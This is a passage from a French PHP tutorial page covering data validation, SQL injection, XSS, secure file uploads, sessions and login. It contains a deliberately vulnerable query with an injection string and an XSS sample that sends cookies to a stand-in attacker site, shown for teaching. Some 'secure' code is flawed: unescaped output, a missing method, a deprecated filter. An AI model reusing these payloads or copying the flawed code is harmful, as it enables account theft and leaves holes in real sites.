                move_uploaded_file($_FILES['fichier']['tmp_name'], $dossier . $nomFichier);
            }
            
            // Insertion en base
            $sql = "INSERT INTO messages_contact (nom, email, sujet, message, fichier_joint, date_envoi) 
                    VALUES (:nom, :email, :sujet, :message, :fichier, NOW())";
            
            $stmt = $pdo->prepare($sql);
            $stmt->execute([
                ':nom' => $nom,
                ':email' => $email,
                ':sujet' => $sujet,
                ':message' => $message,
                ':fichier' => $nomFichier
            ]);
            
            echo "&lt;div style='background: #d4edda; padding: 20px; border-radius: 5px; margin: 20px;'&gt;";
            echo "&lt;h2&gt;✅ Message envoyé avec succès !&lt;/h2&gt;";
            echo "&lt;p&gt;Merci $nom, nous vous répondrons à l'adresse $email dans les plus brefs délais.&lt;/p&gt;";
            echo "&lt;/div&gt;";
            
        } catch (Exception $e) {
            echo "&lt;div style='background: #f8d7da; padding: 20px; border-radius: 5px; margin: 20px;'&gt;";
            echo "&lt;h2&gt;❌ Erreur&lt;/h2&gt;";
            echo "&lt;p&gt;Une erreur est survenue. Veuillez réessayer.&lt;/p&gt;";
            echo "&lt;/div&gt;";
        }
    } else {
        echo "&lt;div style='background: #fff3cd; padding: 20px; border-radius: 5px; margin: 20px;'&gt;";
        echo "&lt;h2&gt;⚠️ Erreurs détectées :&lt;/h2&gt;";
        foreach ($erreurs as $erreur) {
            echo "&lt;p&gt;• $erreur&lt;/p&gt;";
        }
        echo "&lt;/div&gt;";
    }
}
?&gt;</code></pre>
    </details>
</section>

<!-- Partie 14: Validation et sécurisation des données -->
<section class="part14">
    <h2>14. Validation et sécurisation des données</h2>
    
    <p>La sécurité en PHP, c'est comme fermer sa maison à clé ! Vous ne laisseriez jamais votre porte d'entrée ouverte, alors ne laissez pas votre site web vulnérable aux attaques. <strong>Jamais faire confiance aux données venant des utilisateurs</strong> est la règle d'or de la sécurité web.</p>

    <p>Nous allons apprendre à nous protéger contre les principales menaces :</p>
    <ul>
        <li>🗃️ <strong>Injection SQL</strong> : Quand un pirate tente de pirater votre base de données</li>
        <li>🔓 <strong>Attaques XSS</strong> : Injection de code malveillant dans vos pages</li>
        <li>📝 <strong>Données invalides</strong> : Vérifier que tout est correct avant traitement</li>
    </ul>

    <h3>14.1 Filtrage et validation des données</h3>
    
    <p>Avant d'utiliser les données des utilisateurs, il faut les <strong>nettoyer</strong> et <strong>vérifier</strong> qu'elles sont valides.</p>

    <h4>Fonction de nettoyage de base :</h4>
    <pre><code>&lt;?php
function nettoyerDonnee($donnee) {
    // Supprimer les espaces en début/fin
    $donnee = trim($donnee);
    
    // Supprimer les antislashs
    $donnee = stripslashes($donnee);
    
    // Convertir les caractères spéciaux HTML
    $donnee = htmlspecialchars($donnee);
    
    return $donnee;
}

// Utilisation
$nom = nettoyerDonnee($_POST['nom'] ?? '');
$email = nettoyerDonnee($_POST['email'] ?? '');
?&gt;</code></pre>

    <h4>Validation avancée avec les filtres PHP :</h4>
    <pre><code>&lt;?php
function validerDonnees($donnees) {
    $erreurs = [];
    $donneesClean = [];
    
    // Validation du nom
    if (empty($donnees['nom'])) {
        $erreurs['nom'] = "Le nom est obligatoire";
    } else {
        $nom = filter_var(trim($donnees['nom']), FILTER_SANITIZE_STRING);
        if (strlen($nom) &lt; 2) {
            $erreurs['nom'] = "Le nom doit faire au moins 2 caractères";
        } elseif (strlen($nom) &gt; 50) {
            $erreurs['nom'] = "Le nom ne peut pas dépasser 50 caractères";
        } else {
            $donneesClean['nom'] = $nom;
        }
    }
    
    // Validation de l'email
    if (empty($donnees['email'])) {
        $erreurs['email'] = "L'email est obligatoire";
    } else {
        $email = filter_var(trim($donnees['email']), FILTER_VALIDATE_EMAIL);
        if ($email === false) {
            $erreurs['email'] = "Format d'email invalide";
        } else {
            $donneesClean['email'] = $email;
        }
    }
    
    // Validation de l'âge
    if (!empty($donnees['age'])) {
        $age = filter_var($donnees['age'], FILTER_VALIDATE_INT, [
            'options' => [
                'min_range' => 13,
                'max_range' => 120
            ]
        ]);
        
        if ($age === false) {
            $erreurs['age'] = "L'âge doit être entre 13 et 120 ans";
        } else {
            $donneesClean['age'] = $age;
        }
    }
    
    // Validation du téléphone
    if (!empty($donnees['telephone'])) {
        $tel = preg_replace('/[^0-9+\-\s\.]/', '', $donnees['telephone']);
        if (strlen($tel) &lt; 10) {
            $erreurs['telephone'] = "Numéro de téléphone invalide";
        } else {
            $donneesClean['telephone'] = $tel;
        }
    }
    
    return [
        'erreurs' => $erreurs,
        'donnees' => $donneesClean,
        'valide' => empty($erreurs)
    ];
}

// Utilisation
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $validation = validerDonnees($_POST);
    
    if ($validation['valide']) {
        echo "✅ Toutes les données sont valides !";
        // Procéder à l'insertion en base
    } else {
        echo "&lt;div style='background: #f8d7da; padding: 15px; border-radius: 5px;'&gt;";
        echo "&lt;h4&gt;❌ Erreurs détectées :&lt;/h4&gt;";
        foreach ($validation['erreurs'] as $champ =&gt; $erreur) {
            echo "&lt;p&gt;&lt;strong&gt;$champ :&lt;/strong&gt; $erreur&lt;/p&gt;";
        }
        echo "&lt;/div&gt;";
    }
}
?&gt;</code></pre>

    <h3>14.2 Protection contre les injections SQL</h3>
    
    <p>L'injection SQL est l'une des attaques les plus dangereuses. Un pirate peut littéralement "parler" directement à votre base de données !</p>

    <h4>❌ Code vulnérable (JAMAIS faire ça !) :</h4>
    <pre><code>&lt;?php
// DANGER ! Code vulnérable aux injections SQL
$email = $_POST['email'];
$password = $_POST['password'];

$sql = "SELECT * FROM utilisateurs WHERE email = '$email' AND password = '$password'";
$result = $pdo-&gt;query($sql);

// Un pirate pourrait envoyer :
// email: admin@site.com' OR '1'='1' --
// password: n'importe quoi
// La requête devient : SELECT * FROM utilisateurs WHERE email = 'admin@site.com' OR '1'='1' --' AND password = '...'
// Le -- met le reste en commentaire, et 1=1 est toujours vrai !
?&gt;</code></pre>

    <h4>✅ Code sécurisé avec requêtes préparées :</h4>
    <pre><code>&lt;?php
function connexionSecurisee($pdo, $email, $password) {
    // Validation des entrées
    $email = filter_var(trim($email), FILTER_VALIDATE_EMAIL);
    if (!$email) {
        return ['succes' => false, 'message' => 'Email invalide'];
    }
    
    // Requête préparée - SÉCURISÉE
    $sql = "SELECT id, nom, prenom, email, password_hash 
            FROM utilisateurs 
            WHERE email = :email AND actif = 1";
    
    try {
        $stmt = $pdo-&gt;prepare($sql);
        $stmt-&gt;execute([':email' =&gt; $email]);
        $utilisateur = $stmt-&gt;fetch();
        
        if ($utilisateur && password_verify($password, $utilisateur['password_hash'])) {
            // Connexion réussie
            session_start();
            $_SESSION['user_id'] = $utilisateur['id'];
            $_SESSION['user_nom'] = $utilisateur['nom'];
            
            return [
                'succes' => true, 
                'message' => 'Connexion réussie',
                'utilisateur' => $utilisateur
            ];
        } else {
            return ['succes' => false, 'message' => 'Email ou mot de passe incorrect'];
        }
        
    } catch (PDOException $e) {
        error_log("Erreur connexion : " . $e-&gt;getMessage());
        return ['succes' => false, 'message' => 'Erreur système'];
    }
}

// Utilisation
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $resultat = connexionSecurisee($pdo, $_POST['email'], $_POST['password']);
    
    if ($resultat['succes']) {
        header('Location: dashboard.php');
        exit;
    } else {
        $messageErreur = $resultat['message'];
    }
}
?&gt;</code></pre>

    <h3>14.3 Protection contre les attaques XSS</h3>
    
    <p>Les attaques XSS (Cross-Site Scripting) consistent à injecter du code JavaScript malveillant dans votre site.</p>

    <h4>Scénario d'attaque XSS :</h4>
    <pre><code>&lt;!-- Un pirate pourrait soumettre ce commentaire : --&gt;
&lt;script&gt;
    // Code malveillant qui vole les cookies et les envoie au pirate
    document.location = 'http://site-pirate.com/voler.php?cookies=' + document.cookie;
&lt;/script&gt;</code></pre>

    <h4>Protection avec htmlspecialchars() :</h4>
    <pre><code>&lt;?php
function afficherCommentaireSecurise($commentaire) {
    // Convertit &lt;script&gt; en &amp;lt;script&amp;gt; - inoffensif !
    return htmlspecialchars($commentaire, ENT_QUOTES, 'UTF-8');
}

function afficherCommentairesAvancee($commentaire) {
    // Nettoyage plus avancé
    $commentaire = trim($commentaire);
    
    // Supprimer les balises dangereuses
    $commentaire = strip_tags($commentaire, '&lt;b&gt;&lt;i&gt;&lt;u&gt;&lt;br&gt;&lt;p&gt;');
    
    // Échapper pour l'affichage HTML
    $commentaire = htmlspecialchars($commentaire, ENT_QUOTES, 'UTF-8');
    
    // Convertir les retours à la ligne
    $commentaire = nl2br($commentaire);
    
    return $commentaire;
}

// Exemple d'utilisation dans un système de commentaires
function ajouterCommentaire($pdo, $nom, $email, $commentaire) {
    // Validation
    $erreurs = [];
    
    if (empty($nom) || strlen($nom) &lt; 2) {
        $erreurs[] = "Nom invalide";
    }
    
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $erreurs[] = "Email invalide";
    }
    
    if (empty($commentaire) || strlen($commentaire) &lt; 10) {
        $erreurs[] = "Commentaire trop court (minimum 10 caractères)";
    }
    
    // Vérifier les mots interdits
    $motsInterdits = ['spam', 'viagra', 'casino'];
    foreach ($motsInterdits as $mot) {
        if (stripos($commentaire, $mot) !== false) {
            $erreurs[] = "Contenu non autorisé détecté";
            break;
        }
    }
    
    if (empty($erreurs)) {
        $sql = "INSERT INTO commentaires (nom, email, commentaire, date_creation, modere) 
                VALUES (:nom, :email, :commentaire, NOW(), 0)";
        
        try {
            $stmt = $pdo-&gt;prepare($sql);
            $stmt-&gt;execute([
                ':nom' =&gt; htmlspecialchars($nom),
                ':email' =&gt; $email,
                ':commentaire' =&gt; htmlspecialchars($commentaire)
            ]);
            
            return ['succes' =&gt; true, 'message' =&gt; 'Commentaire ajouté (en attente de modération)'];
            
        } catch (PDOException $e) {
            return ['succes' =&gt; false, 'message' =&gt; 'Erreur lors de l\'ajout'];
        }
    }
    
    return ['succes' =&gt; false, 'erreurs' =&gt; $erreurs];
}
?&gt;</code></pre>

    <h3>14.4 Validation spécialisée par type de données</h3>
    
    <h4>Classe de validation complète :</h4>
    <pre><code>&lt;?php
class Validateur {
    private $erreurs = [];
    
    public function validerNom($nom, $obligatoire = true) {
        if ($obligatoire && empty($nom)) {
            $this-&gt;erreurs['nom'] = "Le nom est obligatoire";
            return false;
        }
        
        if (!empty($nom)) {
            $nom = trim($nom);
            if (strlen($nom) &lt; 2) {
                $this-&gt;erreurs['nom'] = "Le nom doit faire au moins 2 caractères";
                return false;
            }
            
            if (!preg_match("/^[a-zA-ZÀ-ÿ\s\-']+$/u", $nom)) {
                $this-&gt;erreurs['nom'] = "Le nom contient des caractères invalides";
                return false;
            }
        }
        
        return true;
    }
    
    public function validerEmail($email, $obligatoire = true) {
        if ($obligatoire && empty($email)) {
            $this-&gt;erreurs['email'] = "L'email est obligatoire";
            return false;
        }
        
        if (!empty($email)) {
            $email = filter_var(trim($email), FILTER_VALIDATE_EMAIL);
            if (!$email) {
                $this-&gt;erreurs['email'] = "Format d'email invalide";
                return false;
            }
        }
        
        return true;
    }
    
    public function validerMotDePasse($password) {
        if (empty($password)) {
            $this-&gt;erreurs['password'] = "Le mot de passe est obligatoire";
            return false;
        }
        
        if (strlen($password) &lt; 8) {
            $this-&gt;erreurs['password'] = "Le mot de passe doit faire au moins 8 caractères";
            return false;
        }
        
        if (!preg_match("/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/", $password)) {
            $this-&gt;erreurs['password'] = "Le mot de passe doit contenir au moins une minuscule, une majuscule et un chiffre";
            return false;
        }
        
        return true;
    }
    
    public function validerTelephone($telephone, $obligatoire = false) {
        if ($obligatoire && empty($telephone)) {
            $this-&gt;erreurs['telephone'] = "Le téléphone est obligatoire";
            return false;
        }
        
        if (!empty($telephone)) {
            // Accepter différents formats français
            $patterns = [
                '/^0[1-9](\d{8})$/',           // 0123456789
                '/^0[1-9]([-\s]?\d{2}){4}$/',  // 01 23 45 67 89
                '/^\+33[1-9](\d{8})$/'         // +33123456789
            ];
            
            $telephone = preg_replace('/[\s\-\.]/', '', $telephone);
            $valide = false;
            
            foreach ($patterns as $pattern) {
                if (preg_match($pattern, $telephone)) {
                    $valide = true;
                    break;
                }
            }
            
            if (!$valide) {
                $this-&gt;erreurs['telephone'] = "Format de téléphone invalide";
                return false;
            }
        }
        
        return true;
    }
    
    public function validerURL($url, $obligatoire = false) {
        if ($obligatoire && empty($url)) {
            $this-&gt;erreurs['url'] = "L'URL est obligatoire";
            return false;
        }
        
        if (!empty($url)) {
            if (!filter_var($url, FILTER_VALIDATE_URL)) {
                $this-&gt;erreurs['url'] = "Format d'URL invalide";
                return false;
            }
        }
        
        return true;
    }
    
    public function obtenirErreurs() {
        return $this-&gt;erreurs;
    }
    
    public function estValide() {
        return empty($this-&gt;erreurs);
    }
    
    public function reinitialiser() {
        $this-&gt;erreurs = [];
    }
}

// Utilisation
$validateur = new Validateur();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $validateur-&gt;validerNom($_POST['nom']);
    $validateur-&gt;validerEmail($_POST['email']);
    $validateur-&gt;validerMotDePasse($_POST['password']);
    $validateur-&gt;validerTelephone($_POST['telephone']);
    
    if ($validateur-&gt;estValide()) {
        echo "✅ Toutes les données sont valides !";
        // Procéder à l'insertion
    } else {
        echo "&lt;div style='background: #f8d7da; padding: 15px; border-radius: 5px;'&gt;";
        echo "&lt;h4&gt;❌ Erreurs de validation :&lt;/h4&gt;";
        foreach ($validateur-&gt;obtenirErreurs() as $champ =&gt; $erreur) {
            echo "&lt;p&gt;&lt;strong&gt;$champ :&lt;/strong&gt; $erreur&lt;/p&gt;";
        }
        echo "&lt;/div&gt;";
    }
}
?&gt;</code></pre>

    <h3>14.5 Sécurisation des uploads de fichiers</h3>
    
    <p>L'upload de fichiers est particulièrement dangereux si mal sécurisé !</p>

    <pre><code>&lt;?php
class SecuriteUpload {
    private $typesAutorises = [
        'image/jpeg',
        'image/png', 
        'image/gif',
        'application/pdf',
        'text/plain'
    ];
    
    private $extensionsAutorisees = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'txt'];
    private $tailleMax = 5242880; // 5 MB
    
    public function validerFichier($fichier) {
        $erreurs = [];
        
        // Vérifier qu'il n'y a pas d'erreur d'upload
        if ($fichier['error'] !== UPLOAD_ERR_OK) {
            $erreurs[] = "Erreur lors de l'upload du fichier";
            return $erreurs;
        }
        
        // Vérifier la taille
        if ($fichier['size'] &gt; $this-&gt;tailleMax) {
            $erreurs[] = "Le fichier est trop volumineux (max " . 
                        number_format($this-&gt;tailleMax / 1024 / 1024, 1) . " MB)";
        }
        
        // Vérifier le type MIME
        if (!in_array($fichier['type'], $this-&gt;typesAutorises)) {
            $erreurs[] = "Type de fichier non autorisé";
        }
        
        // Vérifier l'extension
        $extension = strtolower(pathinfo($fichier['name'], PATHINFO_EXTENSION));
        if (!in_array($extension, $this-&gt;extensionsAutorisees)) {
            $erreurs[] = "Extension de fichier non autorisée";
        }
        
        // Vérifier que c'est vraiment une image si c'est déclaré comme tel
        if (strpos($fichier['type'], 'image/') === 0) {
            $infoImage = getimagesize($fichier['tmp_name']);
            if ($infoImage === false) {
                $erreurs[] = "Le fichier n'est pas une image valide";
            }
        }
        
        return $erreurs;
    }
    
    public function sauvegarderFichier($fichier, $dossierDestination) {
        $erreurs = $this-&gt;validerFichier($fichier);
        
        if (!empty($erreurs)) {
            return ['succes' =&gt; false, 'erreurs' =&gt; $erreurs];
        }
        
        // Créer le dossier si nécessaire
        if (!is_dir($dossierDestination)) {
            mkdir($dossierDestination, 0755, true);
        }
        
        // Générer un nom sécurisé
        $extension = strtolower(pathinfo($fichier['name'], PATHINFO_EXTENSION));
        $nomSecurise = uniqid() . '_' . time() . '.' . $extension;
        $cheminComplet = $dossierDestination . '/' . $nomSecurise;
        
        // Déplacer le fichier
        if (move_uploaded_file($fichier['tmp_name'], $cheminComplet)) {
            return [
                'succes' =&gt; true,
                'nom_fichier' =&gt; $nomSecurise,
                'chemin_complet' =&gt; $cheminComplet,
                'taille' =&gt; $fichier['size']
            ];
        } else {
            return ['succes' =&gt; false, 'erreurs' =&gt; ['Erreur lors de la sauvegarde']];
        }
    }
}

// Utilisation
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo'])) {
    $secureUpload = new SecuriteUpload();
    $resultat = $secureUpload-&gt;sauvegarderFichier($_FILES['photo'], 'uploads/photos');
    
    if ($resultat['succes']) {
        echo "✅ Fichier uploadé : " . $resultat['nom_fichier'];
    } else {
        echo "❌ Erreurs : " . implode(', ', $resultat['erreurs']);
    }
}
?&gt;</code></pre>

    <h3>14.6 Exercice pratique : Système d'inscription sécurisé</h3>
    
    <p><strong>Objectif :</strong> Créer un système d'inscription complètement sécurisé.</p>
    
    <p><strong>Créez :</strong></p>
    <ol>
        <li>Un formulaire d'inscription avec validation côté client (HTML5)</li>
        <li>Une validation côté serveur complète</li>
        <li>Hachage sécurisé des mots de passe</li>
        <li>Protection contre les doublons d'email</li>
        <li>Upload d'avatar sécurisé</li>
        <li>Messages d'erreur clairs et sécurisés</li>
    </ol>

    <details>
        <summary><strong>💡 Voir la solution</strong></summary>
        <pre><code>&lt;!-- inscription_securisee.html --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Inscription sécurisée&lt;/title&gt;
    &lt;style&gt;
        .form-container { max-width: 600px; margin: 20px auto; padding: 20px; border: 1px solid #ddd; border-radius: 8px; }
        .field { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input, select { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
        .error { color: red; font-size: 0.9em; }
        .success { color: green; background: #d4edda; padding: 10px; border-radius: 4px; }
        button { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="form-container"&gt;
        &lt;h2&gt;🔐 Inscription sécurisée&lt;/h2&gt;
        
        &lt;form method="POST" action="traiter_inscription_securisee.php" enctype="multipart/form-data"&gt;
            &lt;div class="field"&gt;
                &lt;label for="nom"&gt;Nom complet * :&lt;/label&gt;
                &lt;input type="text" id="nom" name="nom" required minlength="2" maxlength="50"&gt;
            &lt;/div&gt;
            
            &lt;div class="field"&gt;
                &lt;label for="email"&gt;Email * :&lt;/label&gt;
                &lt;input type="email" id="email" name="email" required&gt;
            &lt;/div&gt;
            
            &lt;div class="field"&gt;
                &lt;label for="password"&gt;Mot de passe * :&lt;/label&gt;
                &lt;input type="password" id="password" name="password" required minlength="8"&gt;
                &lt;small&gt;Au moins 8 caractères avec majuscule, minuscule et chiffre&lt;/small&gt;
            &lt;/div&gt;
            
            &lt;div class="field"&gt;
                &lt;label for="confirm_password"&gt;Confirmer le mot de passe * :&lt;/label&gt;
                &lt;input type="password" id="confirm_password" name="confirm_password" required&gt;
            &lt;/div&gt;
            
            &lt;div class="field"&gt;
                &lt;label for="telephone"&gt;Téléphone :&lt;/label&gt;
                &lt;input type="tel" id="telephone" name="telephone" placeholder="06 12 34 56 78"&gt;
            &lt;/div&gt;
            
            &lt;div class="field"&gt;
                &lt;label for="avatar"&gt;Avatar (optionnel) :&lt;/label&gt;
                &lt;input type="file" id="avatar" name="avatar" accept="image/*"&gt;
            &lt;/div&gt;
            
            &lt;button type="submit"&gt;🚀 S'inscrire&lt;/button&gt;
        &lt;/form&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;?php
// traiter_inscription_securisee.php
require_once 'config.php';
require_once 'Validateur.php';
require_once 'SecuriteUpload.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $validateur = new Validateur();
    $upload = new SecuriteUpload();
    
    // Récupération des données
    $nom = trim($_POST['nom'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirmPassword = $_POST['confirm_password'] ?? '';
    $telephone = trim($_POST['telephone'] ?? '');
    
    // Validation
    $validateur-&gt;validerNom($nom);
    $validateur-&gt;validerEmail($email);
    $validateur-&gt;validerMotDePasse($password);
    $validateur-&gt;validerTelephone($telephone, false);
    
    // Vérifier que les mots de passe correspondent
    if ($password !== $confirmPassword) {
        $validateur-&gt;ajouterErreur('confirm_password', 'Les mots de passe ne correspondent pas');
    }
    
    $pdo = connecterDB();
    
    // Vérifier que l'email n'existe pas déjà
    $sql = "SELECT id FROM utilisateurs WHERE email = :email";
    $stmt = $pdo-&gt;prepare($sql);
    $stmt-&gt;execute([':email' =&gt; $email]);
    if ($stmt-&gt;fetch()) {
        $validateur-&gt;ajouterErreur('email', 'Cet email est déjà utilisé');
    }
    
    // Traitement de l'avatar
    $avatar = null;
    if (isset($_FILES['avatar']) && $_FILES['avatar']['error'] === UPLOAD_ERR_OK) {
        $resultatUpload = $upload-&gt;sauvegarderFichier($_FILES['avatar'], 'uploads/avatars');
        if ($resultatUpload['succes']) {
            $avatar = $resultatUpload['nom_fichier'];
        } else {
            foreach ($resultatUpload['erreurs'] as $erreur) {
                $validateur-&gt;ajouterErreur('avatar', $erreur);
            }
        }
    }
    
    // Si tout est valide, procéder à l'inscription
    if ($validateur-&gt;estValide()) {
        try {
            $passwordHash = password_hash($password, PASSWORD_DEFAULT);
            
            $sql = "INSERT INTO utilisateurs (nom, email, password_hash, telephone, avatar, date_inscription) 
                    VALUES (:nom, :email, :password, :telephone, :avatar, NOW())";
            
            $stmt = $pdo-&gt;prepare($sql);
            $stmt-&gt;execute([
                ':nom' =&gt; $nom,
                ':email' =&gt; $email,
                ':password' =&gt; $passwordHash,
                ':telephone' =&gt; $telephone,
                ':avatar' =&gt; $avatar
            ]);
            
            echo "&lt;div class='success'&gt;";
            echo "&lt;h2&gt;✅ Inscription réussie !&lt;/h2&gt;";
            echo "&lt;p&gt;Bienvenue $nom ! Votre compte a été créé avec succès.&lt;/p&gt;";
            if ($avatar) {
                echo "&lt;p&gt;Avatar uploadé : &lt;img src='uploads/avatars/$avatar' style='width: 50px; height: 50px; border-radius: 50%;'&gt;&lt;/p&gt;";
            }
            echo "&lt;p&gt;&lt;a href='connexion.php'&gt;Se connecter&lt;/a&gt;&lt;/p&gt;";
            echo "&lt;/div&gt;";
            
        } catch (PDOException $e) {
            echo "&lt;div class='error'&gt;❌ Erreur lors de l'inscription. Veuillez réessayer.&lt;/div&gt;";
            error_log("Erreur inscription : " . $e-&gt;getMessage());
        }
    } else {
        echo "&lt;div style='background: #f8d7da; padding: 15px; border-radius: 5px; margin: 20px;'&gt;";
        echo "&lt;h3&gt;❌ Erreurs détectées :&lt;/h3&gt;";
        foreach ($validateur-&gt;obtenirErreurs() as $champ =&gt; $erreur) {
            echo "&lt;p&gt;&lt;strong&gt;" . ucfirst($champ) . " :&lt;/strong&gt; $erreur&lt;/p&gt;";
        }
        echo "&lt;/div&gt;";
    }
}
?&gt;</code></pre>
    </details>
</section>

<!-- Partie 15: Sessions et cookies -->
<section class="part15">
    <h2>15. Sessions et cookies</h2>
    
    <p>Imaginez que vous allez dans un magasin : le vendeur vous reconnaît, se souvient de vos préférences et de votre panier d'achat. Sur le web, c'est pareil ! Les <strong>sessions</strong> et <strong>cookies</strong> permettent à votre site de "se souvenir" des utilisateurs entre les pages et les visites.</p>

    <p><strong>La différence principale :</strong></p>
    <ul>
        <li>🍪 <strong>Cookies</strong> : Stockés sur l'ordinateur de l'utilisateur (comme une carte de fidélité)</li>
        <li>📝 <strong>Sessions</strong> : Stockées sur le serveur (comme un dossier client)</li>
    </ul>

    <h3>15.1 Les sessions - Mémoire temporaire du serveur</h3>
    
    <p>Une <strong>session</strong> est comme un casier temporaire sur le serveur où vous stockez des informations spécifiques à chaque utilisateur pendant sa visite.</p>

    <h4>Démarrer une session :</h4>
    <pre><code>&lt;?php
// TOUJOURS appeler session_start() en premier !
// (avant tout contenu HTML)
session_start();

// Maintenant on peut utiliser $_SESSION
$_SESSION['nom_utilisateur'] = 'Jean Dupont';
$_SESSION['user_id'] = 123;
$_SESSION['role'] = 'admin';

echo "Session démarrée pour : " . $_SESSION['nom_utilisateur'];
?&gt;</code></pre>

    <h4>Lire et modifier les données de session :</h4>
    <pre><code>&lt;?php
session_start();

// Vérifier si l'utilisateur est connecté
if (isset($_SESSION['user_id'])) {
    echo "Bonjour " . $_SESSION['nom_utilisateur'] . " !";
    
    // Modifier des données de session
    $_SESSION['derniere_page'] = 'accueil.php';
    $_SESSION['nombre_visites'] = ($_SESSION['nombre_visites'] ?? 0) + 1;
    
    echo "Nombre de pages visitées : " . $_SESSION['nombre_visites'];
} else {
    echo "Vous n'êtes pas connecté.";
    echo "&lt;a href='connexion.php'&gt;Se connecter&lt;/a&gt;";
}
?&gt;</code></pre>

    <h4>Système de connexion complet :</h4>
    <pre><code>&lt;?php
// connexion.php
session_start();
require_once 'config.php';

// Si déjà connecté, rediriger
if (isset($_SESSION['user_id'])) {
    header('Location: dashboard.php');
    exit;
}

$messageErreur = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    
    if (!empty($email) && !empty($password)) {
        $pdo = connecterDB();
        
        $sql = "SELECT id, nom, prenom, email, password_hash, role 
                FROM utilisateurs 
                WHERE email = :email AND actif = 1";
        
        $stmt = $pdo-&gt;prepare($sql);
        $stmt-&gt;execute([':email' =&gt; $email]);
        $utilisateur = $stmt-&gt;fetch();
        
        if ($utilisateur && password_verify($password, $utilisateur['password_hash'])) {
            // Connexion réussie - Créer la session
            $_SESSION['user_id'] = $utilisateur['id'];
            $_SESSION['nom_complet'] = $utilisateur['prenom'] . ' ' . $utilisateur['nom'];
            $_SESSION['email'] = $utilisateur['email'];
            $_SESSION['role'] = $utilisateur['role'];
            $_SESSION['connexion_timestamp'] = time();
            
            // Rediriger vers le tableau de bord
            header('Location: dashboard.php');
            exit;
        } else {
            $messageErreur = "Email ou mot de passe incorrect.";
        }
    } else {
        $messageErreur = "Veuillez remplir tous les champs.";
    }
}
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Connexion&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h2&gt;🔐 Connexion&lt;/h2&gt;
    
    &lt;?php if ($messageErreur): ?&gt;
        &lt;div style="background: #f8d7da; padding: 10px; border-radius: 5px; margin: 10px 0;"&gt;
            ❌ &lt;?= htmlspecialchars($messageErreur) ?&gt;
        &lt;/div&gt;
    &lt;?php endif; ?&gt;
    
    &lt;form method="POST"&gt;
        &lt;div&gt;
            &lt;label for="email"&gt;Email :&lt;/label&gt;
            &lt;input type="email" id="email" name="email" required value="&lt;?= htmlspecialchars($_POST['email'] ?? '') ?&gt;"&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="password"&gt;Mot de passe :&lt;/label&gt;
            &lt;input type="password" id="password" name="password" required&gt;
        &lt;/div&gt;
        
        &lt;button type="submit"&gt;Se connecter&lt;/button&gt;
    &lt;/form&gt;
    
    &lt;p&gt;&lt;a href="inscription.php"&gt;Pas encore de compte ? S'inscrire&lt;/a&gt;&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

    <h4>Déconnexion et destruction de session :</h4>
    <pre><code>&lt;?php
// deconnexion.php
session_start();

// Détruire toutes les données de session
session_unset();

// Détruire la session
session_destroy();

// Rediriger vers la page d'accueil
header('Location: index.php');
exit;
?&gt;</code></pre>

    <h3>15.2 Protection des pages avec les sessions</h3>
    
    <h4>Fonction de vérification d'authentification :</h4>
    <pre><code>&lt;?php
// auth.php - Fichier à inclure dans les pages protégées
function verifierConnexion($roleRequis = null) {
    session_start();
    
    // Vérifier si l'utilisateur est connecté
    if (!isset($_SESSION['user_id'])) {
        header('Location: connexion.php');
        exit;
    }
    
    // Vérifier le rôle si spécifié
    if ($roleRequis && $_SESSION['role'] !== $roleRequis) {
        die("Accès refusé : permissions insuffisantes.");
    }
    
    // Vérifier que la session n'est pas trop ancienne (24h)
    if (isset($_SESSION['connexion_timestamp'])) {
        $tempsEcoule = time() - $_SESSION['connexion_timestamp'];
        if ($tempsEcoule &gt; 86400) { // 24 heures
            session_destroy();
            header('Location: connexion.php?message=session_expiree');
            exit;
        }
    }
    
    return $_SESSION;
}

function obtenirUtilisateurConnecte() {
    if (isset($_SESSION['user_id'])) {
        return [
            'id' =&gt; $_SESSION['user_id'],
            'nom' =&gt; $_SESSION['nom_complet'],
            'email' =&gt; $_SESSION['email'],
            'role' =&gt; $_SESSION['role']
        ];
    }
    return null;
}
?&gt;</code></pre>

    <h4>Page protégée :</h4>
    <pre><code>&lt;?php
// dashboard.php
require_once 'auth.php';

// Vérifier que l'utilisateur est connecté
$utilisateur = verifierConnexion();
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Tableau de bord&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;🏠 Tableau de bord&lt;/h1&gt;
    
    &lt;div style="background: #d4edda; padding: 15px; border-radius: 5px; margin: 15px 0;"&gt;
        &lt;h3&gt;Bienvenue &lt;?= htmlspecialchars($utilisateur['nom_complet']) ?&gt; !&lt;/h3&gt;
        &lt;p&gt;Email : &lt;?= htmlspecialchars($utilisateur['email']) ?&gt;&lt;/p&gt;
        &lt;p&gt;Rôle : &lt;?= htmlspecialchars($utilisateur['role']) ?&gt;&lt;/p&gt;
        &lt;p&gt;Connecté depuis : &lt;?= date('d/m/Y H:i', $_SESSION['connexion_timestamp']) ?&gt;&lt;/p&gt;
    &lt;/div&gt;
    
    &lt;nav&gt;
        &lt;a href="profil.php"&gt;Mon profil&lt;/a&gt; | 
